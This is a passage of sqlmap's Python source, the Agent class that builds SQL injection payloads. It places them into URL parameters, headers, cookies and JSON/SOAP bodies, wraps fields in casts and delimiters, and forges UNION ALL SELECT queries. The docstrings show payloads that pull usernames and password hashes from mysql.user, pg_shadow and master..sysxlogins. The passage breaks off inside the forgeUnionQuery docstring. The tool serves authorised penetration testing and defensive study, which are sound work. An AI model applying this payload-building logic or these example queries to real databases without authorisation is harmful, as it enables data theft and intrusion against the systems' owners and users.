#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import base64
import re

from lib.core.common import Backend
from lib.core.common import extractRegexResult
from lib.core.common import filterNone
from lib.core.common import getSQLSnippet
from lib.core.common import isDBMSVersionAtLeast
from lib.core.common import isNumber
from lib.core.common import isTechniqueAvailable
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import safeSQLIdentificatorNaming
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.common import splitFields
from lib.core.common import unArrayizeValue
from lib.core.common import urlencode
from lib.core.common import zeroDepthSearch
from lib.core.compat import xrange
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import queries
from lib.core.dicts import DUMP_DATA_PREPROCESS
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import DBMS
from lib.core.enums import HTTP_HEADER
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.enums import POST_HINT
from lib.core.exception import SqlmapNoneDataException
from lib.core.settings import BOUNDARY_BACKSLASH_MARKER
from lib.core.settings import BOUNDED_INJECTION_MARKER
from lib.core.settings import DEFAULT_COOKIE_DELIMITER
from lib.core.settings import DEFAULT_GET_POST_DELIMITER
from lib.core.settings import GENERIC_SQL_COMMENT
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import NULL
from lib.core.settings import PAYLOAD_DELIMITER
from lib.core.settings import REPLACEMENT_MARKER
from lib.core.settings import SINGLE_QUOTE_MARKER
from lib.core.settings import SLEEP_TIME_MARKER
from lib.core.unescaper import unescaper

class Agent(object):
    """
    This class defines the SQL agent methods.
    """

    def payloadDirect(self, query):
        query = self.cleanupPayload(query)

        if query.upper().startswith("AND "):
            query = re.sub(r"(?i)AND ", "SELECT ", query, 1)
        elif query.upper().startswith(" UNION ALL "):
            query = re.sub(r"(?i) UNION ALL ", "", query, 1)
        elif query.startswith("; "):
            query = query.replace("; ", "", 1)

        if Backend.getIdentifiedDbms() in (DBMS.ORACLE,):  # non-standard object(s) make problems to a database connector while returned (e.g. XMLTYPE)
            _, _, _, _, _, _, fieldsToCastStr, _ = self.getFields(query)
            for field in fieldsToCastStr.split(','):
                query = query.replace(field, self.nullAndCastField(field))

        if kb.tamperFunctions:
            for function in kb.tamperFunctions:
                query = function(payload=query)

        return query

    def payload(self, place=None, parameter=None, value=None, newValue=None, where=None):
        """
        This method replaces the affected parameter with the SQL
        injection statement to request
        """

        if conf.direct:
            return self.payloadDirect(newValue)

        retVal = ""

        if kb.forceWhere:
            where = kb.forceWhere
        elif where is None and isTechniqueAvailable(kb.technique):
            where = kb.injection.data[kb.technique].where

        if kb.injection.place is not None:
            place = kb.injection.place

        if kb.injection.parameter is not None:
            parameter = kb.injection.parameter

        paramString = conf.parameters[place]
        paramDict = conf.paramDict[place]
        origValue = getUnicode(paramDict[parameter])
        newValue = getUnicode(newValue) if newValue else newValue

        if place == PLACE.URI or BOUNDED_INJECTION_MARKER in origValue:
            paramString = origValue
            if place == PLACE.URI:
                origValue = origValue.split(kb.customInjectionMark)[0]
            else:
                origValue = filterNone(re.search(_, origValue.split(BOUNDED_INJECTION_MARKER)[0]) for _ in (r"\w+\Z", r"[^\"'><]+\Z", r"[^ ]+\Z"))[0].group(0)
            origValue = origValue[origValue.rfind('/') + 1:]
            for char in ('?', '=', ':', ',', '&'):
                if char in origValue:
                    origValue = origValue[origValue.rfind(char) + 1:]
        elif place == PLACE.CUSTOM_POST:
            paramString = origValue
            origValue = origValue.split(kb.customInjectionMark)[0]
            if kb.postHint in (POST_HINT.SOAP, POST_HINT.XML):
                origValue = origValue.split('>')[-1]
            elif kb.postHint in (POST_HINT.JSON, POST_HINT.JSON_LIKE):
                origValue = extractRegexResult(r"(?s)\"\s*:\s*(?P<result>\d+\Z)", origValue) or extractRegexResult(r'(?s)[\s:]*(?P<result>[^"\[,]+\Z)', origValue)
            else:
                _ = extractRegexResult(r"(?s)(?P<result>[^\s<>{}();'\"&]+\Z)", origValue) or ""
                origValue = _.split('=', 1)[1] if '=' in _ else ""
        elif place == PLACE.CUSTOM_HEADER:
            paramString = origValue
            origValue = origValue[origValue.find(',') + 1:]
            origValue = origValue.split(kb.customInjectionMark)[0]
            match = re.search(r"([^;]+)=(?P<value>[^;]*);?\Z", origValue)
            if match:
                origValue = match.group("value")
            elif ',' in paramString:
                header = paramString.split(',')[0]

                if header.upper() == HTTP_HEADER.AUTHORIZATION.upper():
                    origValue = origValue.split(' ')[-1].split(':')[-1]

        origValue = origValue or ""

        if value is None:
            if where == PAYLOAD.WHERE.ORIGINAL:
                value = origValue
            elif where == PAYLOAD.WHERE.NEGATIVE:
                if conf.invalidLogical:
                    match = re.search(r"\A[^ ]+", newValue)
                    newValue = newValue[len(match.group() if match else ""):]
                    _ = randomInt(2)
                    value = "%s%s AND %s LIKE %s" % (origValue, match.group() if match else "", _, _ + 1)
                elif conf.invalidBignum:
                    value = randomInt(6)
                elif conf.invalidString:
                    value = randomStr(6)
                else:
                    if newValue.startswith("-"):
                        value = ""
                    else:
                        value = "-%s" % randomInt()
            elif where == PAYLOAD.WHERE.REPLACE:
                value = ""
            else:
                value = origValue

            newValue = "%s%s" % (value, newValue)

        newValue = self.cleanupPayload(newValue, origValue)

        if re.sub(r" \(.+", "", parameter) in conf.base64Parameter:
            # TODO: support for POST_HINT
            newValue = base64.b64encode(newValue)
            origValue = base64.b64encode(origValue)

        if place in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER):
            _ = "%s%s" % (origValue, kb.customInjectionMark)
            if kb.postHint == POST_HINT.JSON and not isNumber(newValue) and not '"%s"' % _ in paramString:
                newValue = '"%s"' % newValue
            elif kb.postHint == POST_HINT.JSON_LIKE and not isNumber(newValue) and not "'%s'" % _ in paramString:
                newValue = "'%s'" % newValue
            newValue = newValue.replace(kb.customInjectionMark, REPLACEMENT_MARKER)
            retVal = paramString.replace(_, self.addPayloadDelimiters(newValue))
            retVal = retVal.replace(kb.customInjectionMark, "").replace(REPLACEMENT_MARKER, kb.customInjectionMark)
        elif BOUNDED_INJECTION_MARKER in paramDict[parameter]:
            retVal = paramString.replace("%s%s" % (origValue, BOUNDED_INJECTION_MARKER), self.addPayloadDelimiters(newValue))
        elif place in (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):
            retVal = paramString.replace(origValue, self.addPayloadDelimiters(newValue))
        else:
            def _(pattern, repl, string):
                retVal = string
                match = None
                for match in re.finditer(pattern, string):
                    pass

                if match:
                    while True:
                        _ = re.search(r"\\g<([^>]+)>", repl)
                        if _:
                            try:
                                repl = repl.replace(_.group(0), match.group(int(_.group(1)) if _.group(1).isdigit() else _.group(1)))
                            except IndexError:
                                break
                        else:
                            break
                    retVal = string[:match.start()] + repl + string[match.end():]
                return retVal

            if origValue:
                regex = r"(\A|\b)%s=%s%s" % (re.escape(parameter), re.escape(origValue), r"(\Z|\b)" if origValue[-1].isalnum() else "")
                retVal = _(regex, "%s=%s" % (parameter, self.addPayloadDelimiters(newValue)), paramString)
            else:
                retVal = _(r"(\A|\b)%s=%s(\Z|%s|%s|\s)" % (re.escape(parameter), re.escape(origValue), DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMITER), r"%s=%s\g<2>" % (parameter, self.addPayloadDelimiters(newValue)), paramString)

            if retVal == paramString and urlencode(parameter) != parameter:
                retVal = _(r"(\A|\b)%s=%s" % (re.escape(urlencode(parameter)), re.escape(origValue)), "%s=%s" % (urlencode(parameter), self.addPayloadDelimiters(newValue)), paramString)

        if retVal:
            retVal = retVal.replace(BOUNDARY_BACKSLASH_MARKER, '\\')

        return retVal

    def prefixQuery(self, expression, prefix=None, where=None, clause=None):
        """
        This method defines how the input expression has to be escaped
        to perform the injection depending on the injection type
        identified as valid
        """

        if conf.direct:
            return self.payloadDirect(expression)

        if expression is None:
            return None

        expression = self.cleanupPayload(expression)
        expression = unescaper.escape(expression)
        query = None

        if where is None and kb.technique and kb.technique in kb.injection.data:
            where = kb.injection.data[kb.technique].where

        # If we are replacing (<where>) the parameter original value with
        # our payload do not prepend with the prefix
        if where == PAYLOAD.WHERE.REPLACE:
            query = ""

        # If the technique is stacked queries (<stype>) do not put a space
        # after the prefix or it is in GROUP BY / ORDER BY (<clause>)
        elif kb.technique == PAYLOAD.TECHNIQUE.STACKED:
            query = kb.injection.prefix
        elif kb.injection.clause == [2, 3] or kb.injection.clause == [2] or kb.injection.clause == [3]:
            query = kb.injection.prefix
        elif clause == [2, 3] or clause == [2] or clause == [3]:
            query = prefix

        # In any other case prepend with the full prefix
        else:
            query = kb.injection.prefix or prefix or ""

            if "SELECT '[RANDSTR]'" in query:  # escaping of pre-WHERE prefixes
                query = query.replace("'[RANDSTR]'", unescaper.escape(randomStr(), quote=False))

            if not (expression and expression[0] == ';') and not (query and query[-1] in ('(', ')') and expression and expression[0] in ('(', ')')) and not (query and query[-1] == '('):
                query += " "

        query = "%s%s" % ((query or "").replace('\\', BOUNDARY_BACKSLASH_MARKER), expression)

        return query

    def suffixQuery(self, expression, comment=None, suffix=None, where=None):
        """
        This method appends the DBMS comment to the
        SQL injection request
        """

        if conf.direct:
            return self.payloadDirect(expression)

        if expression is None:
            return None

        expression = self.cleanupPayload(expression)

        # Take default values if None
        suffix = kb.injection.suffix if kb.injection and suffix is None else suffix

        if kb.technique and kb.technique in kb.injection.data:
            where = kb.injection.data[kb.technique].where if where is None else where
            comment = kb.injection.data[kb.technique].comment if comment is None else comment

        if Backend.getIdentifiedDbms() == DBMS.ACCESS and any((comment or "").startswith(_) for _ in ("--", "[GENERIC_SQL_COMMENT]")):
            comment = queries[DBMS.ACCESS].comment.query

        if comment is not None:
            expression += comment

        # If we are replacing (<where>) the parameter original value with
        # our payload do not append the suffix
        if where == PAYLOAD.WHERE.REPLACE and not conf.suffix:
            pass

        elif suffix and not comment:
            expression += suffix.replace('\\', BOUNDARY_BACKSLASH_MARKER)

        return re.sub(r";\W*;", ";", expression)

    def cleanupPayload(self, payload, origValue=None):
        if payload is None:
            return

        replacements = {
            "[DELIMITER_START]": kb.chars.start,
            "[DELIMITER_STOP]": kb.chars.stop,
            "[AT_REPLACE]": kb.chars.at,
            "[SPACE_REPLACE]": kb.chars.space,
            "[DOLLAR_REPLACE]": kb.chars.dollar,
            "[HASH_REPLACE]": kb.chars.hash_,
            "[GENERIC_SQL_COMMENT]": GENERIC_SQL_COMMENT
        }

        for value in re.findall(r"\[[A-Z_]+\]", payload):
            if value in replacements:
                payload = payload.replace(value, replacements[value])

        for _ in set(re.findall(r"(?i)\[RANDNUM(?:\d+)?\]", payload)):
            payload = payload.replace(_, str(randomInt()))

        for _ in set(re.findall(r"(?i)\[RANDSTR(?:\d+)?\]", payload)):
            payload = payload.replace(_, randomStr())

        if origValue is not None:
            origValue = getUnicode(origValue)
            if "[ORIGVALUE]" in payload:
                payload = getUnicode(payload).replace("[ORIGVALUE]", origValue if origValue.isdigit() else unescaper.escape("'%s'" % origValue))
            if "[ORIGINAL]" in payload:
                payload = getUnicode(payload).replace("[ORIGINAL]", origValue)

        if INFERENCE_MARKER in payload:
            if Backend.getIdentifiedDbms() is not None:
                inference = queries[Backend.getIdentifiedDbms()].inference

                if "dbms_version" in inference:
                    if isDBMSVersionAtLeast(inference.dbms_version):
                        inferenceQuery = inference.query
                    else:
                        inferenceQuery = inference.query2
                else:
                    inferenceQuery = inference.query

                payload = payload.replace(INFERENCE_MARKER, inferenceQuery)
            elif not kb.testMode:
                errMsg = "invalid usage of inference payload without "
                errMsg += "knowledge of underlying DBMS"
                raise SqlmapNoneDataException(errMsg)

        return payload

    def adjustLateValues(self, payload):
        """
        Returns payload with a replaced late tags (e.g. SLEEPTIME)
        """

        if payload:
            payload = payload.replace(SLEEP_TIME_MARKER, str(conf.timeSec))
            payload = payload.replace(SINGLE_QUOTE_MARKER, "'")

            for _ in set(re.findall(r"\[RANDNUM(?:\d+)?\]", payload, re.I)):
                payload = payload.replace(_, str(randomInt()))

            for _ in set(re.findall(r"\[RANDSTR(?:\d+)?\]", payload, re.I)):
                payload = payload.replace(_, randomStr())

        return payload

    def getComment(self, request):
        """
        Returns comment form for the given request
        """

        return request.comment if "comment" in request else ""

    def hexConvertField(self, field):
        """
        Returns hex converted field string
        """

        rootQuery = queries[Backend.getIdentifiedDbms()]
        hexField = field

        if "hex" in rootQuery:
            hexField = rootQuery.hex.query % field
        else:
            warnMsg = "switch '--hex' is currently not supported on DBMS %s" % Backend.getIdentifiedDbms()
            singleTimeWarnMessage(warnMsg)

        return hexField

    def nullAndCastField(self, field):
        """
        Take in input a field string and return its processed nulled and
        casted field string.

        Examples:

        MySQL input:  VERSION()
        MySQL output: IFNULL(CAST(VERSION() AS CHAR(10000)), ' ')
        MySQL scope:  VERSION()

        PostgreSQL input:  VERSION()
        PostgreSQL output: COALESCE(CAST(VERSION() AS CHARACTER(10000)), ' ')
        PostgreSQL scope:  VERSION()

        Oracle input:  banner
        Oracle output: NVL(CAST(banner AS VARCHAR(4000)), ' ')
        Oracle scope:  SELECT banner FROM v$version WHERE ROWNUM=1

        Microsoft SQL Server input:  @@VERSION
        Microsoft SQL Server output: ISNULL(CAST(@@VERSION AS VARCHAR(8000)), ' ')
        Microsoft SQL Server scope:  @@VERSION

        @param field: field string to be processed
        @type field: C{str}

        @return: field string nulled and casted
        @rtype: C{str}
        """

        nulledCastedField = field

        if field:
            rootQuery = queries[Backend.getIdentifiedDbms()]

            if field.startswith("(CASE") or field.startswith("(IIF") or conf.noCast:
                nulledCastedField = field
            else:
                if not (Backend.isDbms(DBMS.SQLITE) and not isDBMSVersionAtLeast('3')):
                    nulledCastedField = rootQuery.cast.query % field
                if Backend.getIdentifiedDbms() in (DBMS.ACCESS,):
                    nulledCastedField = rootQuery.isnull.query % (nulledCastedField, nulledCastedField)
                else:
                    nulledCastedField = rootQuery.isnull.query % nulledCastedField

            kb.binaryField = conf.binaryFields and field in conf.binaryFields.split(',')
            if conf.hexConvert or kb.binaryField:
                nulledCastedField = self.hexConvertField(nulledCastedField)

        return nulledCastedField

    def nullCastConcatFields(self, fields):
        """
        Take in input a sequence of fields string and return its processed
        nulled, casted and concatenated fields string.

        Examples:

        MySQL input:  user,password
        MySQL output: IFNULL(CAST(user AS CHAR(10000)), ' '),'UWciUe',IFNULL(CAST(password AS CHAR(10000)), ' ')
        MySQL scope:  SELECT user, password FROM mysql.user

        PostgreSQL input:  usename,passwd
        PostgreSQL output: COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'xRBcZW'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')
        PostgreSQL scope:  SELECT usename, passwd FROM pg_shadow

        Oracle input:  COLUMN_NAME,DATA_TYPE
        Oracle output: NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'UUlHUa'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')
        Oracle scope:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s'

        Microsoft SQL Server input:  name,master.dbo.fn_varbintohexstr(password)
        Microsoft SQL Server output: ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'nTBdow'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')
        Microsoft SQL Server scope:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins

        @param fields: fields string to be processed
        @type fields: C{str}

        @return: fields string nulled, casted and concatened
        @rtype: C{str}
        """

        if not Backend.getIdentifiedDbms():
            return fields

        if fields.startswith("(CASE") or fields.startswith("(IIF") or fields.startswith("SUBSTR") or fields.startswith("MID(") or re.search(r"\A'[^']+'\Z", fields):
            nulledCastedConcatFields = fields
        else:
            fieldsSplitted = splitFields(fields)
            dbmsDelimiter = queries[Backend.getIdentifiedDbms()].delimiter.query
            nulledCastedFields = []

            for field in fieldsSplitted:
                nulledCastedFields.append(self.nullAndCastField(field))

            delimiterStr = "%s'%s'%s" % (dbmsDelimiter, kb.chars.delimiter, dbmsDelimiter)
            nulledCastedConcatFields = delimiterStr.join(field for field in nulledCastedFields)

        return nulledCastedConcatFields

    def getFields(self, query):
        """
        Take in input a query string and return its fields (columns) and
        more details.

        Example:

        Input:  SELECT user, password FROM mysql.user
        Output: user,password

        @param query: query to be processed
        @type query: C{str}

        @return: query fields (columns) and more details
        @rtype: C{str}
        """

        prefixRegex = r"(?:\s+(?:FIRST|SKIP|LIMIT(?: \d+)?)\s+\d+)*"
        fieldsSelectTop = re.search(r"\ASELECT\s+TOP\s+[\d]+\s+(.+?)\s+FROM", query, re.I)
        fieldsSelectRownum = re.search(r"\ASELECT\s+([^()]+?),\s*ROWNUM AS LIMIT FROM", query, re.I)
        fieldsSelectDistinct = re.search(r"\ASELECT%s\s+DISTINCT\((.+?)\)\s+FROM" % prefixRegex, query, re.I)
        fieldsSelectCase = re.search(r"\ASELECT%s\s+(\(CASE WHEN\s+.+\s+END\))" % prefixRegex, query, re.I)
        fieldsSelectFrom = re.search(r"\ASELECT%s\s+(.+?)\s+FROM " % prefixRegex, query, re.I)
        fieldsExists = re.search(r"EXISTS\(([^)]*)\)\Z", query, re.I)
        fieldsSelect = re.search(r"\ASELECT%s\s+(.*)" % prefixRegex, query, re.I)
        fieldsSubstr = re.search(r"\A(SUBSTR|MID\()", query, re.I)
        fieldsMinMaxstr = re.search(r"(?:MIN|MAX)\(([^\(\)]+)\)", query, re.I)
        fieldsNoSelect = query

        _ = zeroDepthSearch(query, " FROM ")
        if not _:
            fieldsSelectFrom = None

        fieldsToCastStr = fieldsNoSelect

        if fieldsSubstr:
            fieldsToCastStr = query
        elif fieldsMinMaxstr:
            fieldsToCastStr = fieldsMinMaxstr.group(1)
        elif fieldsExists:
            if fieldsSelect:
                fieldsToCastStr = fieldsSelect.group(1)
        elif fieldsSelectTop:
            fieldsToCastStr = fieldsSelectTop.group(1)
        elif fieldsSelectRownum:
            fieldsToCastStr = fieldsSelectRownum.group(1)
        elif fieldsSelectDistinct:
            if Backend.getDbms() in (DBMS.HSQLDB,):
                fieldsToCastStr = fieldsNoSelect
            else:
                fieldsToCastStr = fieldsSelectDistinct.group(1)
        elif fieldsSelectCase:
            fieldsToCastStr = fieldsSelectCase.group(1)
        elif fieldsSelectFrom:
            fieldsToCastStr = query[:unArrayizeValue(_)] if _ else query
            fieldsToCastStr = re.sub(r"\ASELECT%s\s+" % prefixRegex, "", fieldsToCastStr)
        elif fieldsSelect:
            fieldsToCastStr = fieldsSelect.group(1)

        fieldsToCastStr = fieldsToCastStr or ""

        # Function
        if re.search(r"\A\w+\(.*\)", fieldsToCastStr, re.I) or (fieldsSelectCase and "WHEN use" not in query) or fieldsSubstr:
            fieldsToCastList = [fieldsToCastStr]
        else:
            fieldsToCastList = splitFields(fieldsToCastStr)

        return fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, fieldsToCastList, fieldsToCastStr, fieldsExists

    def simpleConcatenate(self, first, second):
        rootQuery = queries[Backend.getIdentifiedDbms()]
        return rootQuery.concatenate.query % (first, second)

    def preprocessField(self, table, field):
        """
        Does a field preprocessing (if needed) based on its type (e.g. image to text)
        Note: used primarily in dumping of custom tables
        """

        retVal = field
        if conf.db and table and conf.db in table:
            table = table.split(conf.db)[-1].strip('.')
        try:
            columns = kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(table, True)]
            for name, type_ in columns.items():
                if type_ and type_.upper() in DUMP_DATA_PREPROCESS.get(Backend.getDbms(), {}) and name == field:
                    retVal = DUMP_DATA_PREPROCESS[Backend.getDbms()][type_.upper()] % name
                    break
        except KeyError:
            pass
        return retVal

    def concatQuery(self, query, unpack=True):
        """
        Take in input a query string and return its processed nulled,
        casted and concatenated query string.

        Examples:

        MySQL input:  SELECT user, password FROM mysql.user
        MySQL output: CONCAT('mMvPxc',IFNULL(CAST(user AS CHAR(10000)), ' '),'nXlgnR',IFNULL(CAST(password AS CHAR(10000)), ' '),'YnCzLl') FROM mysql.user

        PostgreSQL input:  SELECT usename, passwd FROM pg_shadow
        PostgreSQL output: 'HsYIBS'||COALESCE(CAST(usename AS CHARACTER(10000)), ' ')||'KTBfZp'||COALESCE(CAST(passwd AS CHARACTER(10000)), ' ')||'LkhmuP' FROM pg_shadow

        Oracle input:  SELECT COLUMN_NAME, DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'
        Oracle output: 'GdBRAo'||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), ' ')||'czEHOf'||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), ' ')||'JVlYgS' FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS'

        Microsoft SQL Server input:  SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
        Microsoft SQL Server output: 'QQMQJO'+ISNULL(CAST(name AS VARCHAR(8000)), ' ')+'kAtlqH'+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), ' ')+'lpEqoi' FROM master..sysxlogins

        @param query: query string to be processed
        @type query: C{str}

        @return: query string nulled, casted and concatenated
        @rtype: C{str}
        """

        if unpack:
            concatenatedQuery = ""
            query = query.replace(", ", ',')
            fieldsSelectFrom, fieldsSelect, fieldsNoSelect, fieldsSelectTop, fieldsSelectCase, _, fieldsToCastStr, fieldsExists = self.getFields(query)
            castedFields = self.nullCastConcatFields(fieldsToCastStr)
            concatenatedQuery = query.replace(fieldsToCastStr, castedFields, 1)
        else:
            return query

        if Backend.isDbms(DBMS.MYSQL):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += ",'%s')" % kb.chars.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += ",'%s')" % kb.chars.stop
            elif fieldsSelectFrom:
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s,'%s')%s" % (concatenatedQuery[:_].replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1), kb.chars.stop, concatenatedQuery[_:])
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += ",'%s')" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "CONCAT('%s',%s,'%s')" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        elif Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.ORACLE, DBMS.SQLITE, DBMS.DB2, DBMS.FIREBIRD, DBMS.HSQLDB, DBMS.H2):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.chars.start, 1)
                concatenatedQuery += "||'%s'" % kb.chars.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||(SELECT " % kb.chars.start, 1)
                concatenatedQuery += ")||'%s'" % kb.chars.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.chars.start, 1)
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s||'%s'%s" % (concatenatedQuery[:_], kb.chars.stop, concatenatedQuery[_:])
                concatenatedQuery = re.sub(r"('%s'\|\|)(.+)(%s)" % (kb.chars.start, re.escape(castedFields)), r"\g<2>\g<1>\g<3>", concatenatedQuery)
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'||" % kb.chars.start, 1)
                concatenatedQuery += "||'%s'" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'||%s||'%s'" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.chars.start, 1)
                concatenatedQuery += "+'%s'" % kb.chars.stop
            elif fieldsSelectTop:
                topNum = re.search(r"\ASELECT\s+TOP\s+([\d]+)\s+", concatenatedQuery, re.I).group(1)
                concatenatedQuery = concatenatedQuery.replace("SELECT TOP %s " % topNum, "TOP %s '%s'+" % (topNum, kb.chars.start), 1)
                concatenatedQuery = concatenatedQuery.replace(" FROM ", "+'%s' FROM " % kb.chars.stop, 1)
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.chars.start, 1)
                concatenatedQuery += "+'%s'" % kb.chars.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.chars.start, 1)
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s+'%s'%s" % (concatenatedQuery[:_], kb.chars.stop, concatenatedQuery[_:])
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'+" % kb.chars.start, 1)
                concatenatedQuery += "+'%s'" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'+%s+'%s'" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        elif Backend.isDbms(DBMS.ACCESS):
            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'&" % kb.chars.start, 1)
                concatenatedQuery += "&'%s'" % kb.chars.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'&(SELECT " % kb.chars.start, 1)
                concatenatedQuery += ")&'%s'" % kb.chars.stop
            elif fieldsSelectFrom:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'&" % kb.chars.start, 1)
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s&'%s'%s" % (concatenatedQuery[:_], kb.chars.stop, concatenatedQuery[_:])
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "'%s'&" % kb.chars.start, 1)
                concatenatedQuery += "&'%s'" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "'%s'&%s&'%s'" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        else:
            warnMsg = "applying generic concatenation (CONCAT)"
            singleTimeWarnMessage(warnMsg)

            if fieldsExists:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT(CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += "),'%s')" % kb.chars.stop
            elif fieldsSelectCase:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT(CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += "),'%s')" % kb.chars.stop
            elif fieldsSelectFrom:
                _ = unArrayizeValue(zeroDepthSearch(concatenatedQuery, " FROM "))
                concatenatedQuery = "%s),'%s')%s" % (concatenatedQuery[:_].replace("SELECT ", "CONCAT(CONCAT('%s'," % kb.chars.start, 1), kb.chars.stop, concatenatedQuery[_:])
            elif fieldsSelect:
                concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT(CONCAT('%s'," % kb.chars.start, 1)
                concatenatedQuery += "),'%s')" % kb.chars.stop
            elif fieldsNoSelect:
                concatenatedQuery = "CONCAT(CONCAT('%s',%s),'%s')" % (kb.chars.start, concatenatedQuery, kb.chars.stop)

        return concatenatedQuery

    def forgeUnionQuery(self, query, position, count, comment, prefix, suffix, char, where, multipleUnions=None, limited=False, fromTable=None):
        """
        Take in input an query (pseudo query) string and return its
        processed UNION ALL SELECT query.

        Examples:

        MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user
        MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488

        PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow
        PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713

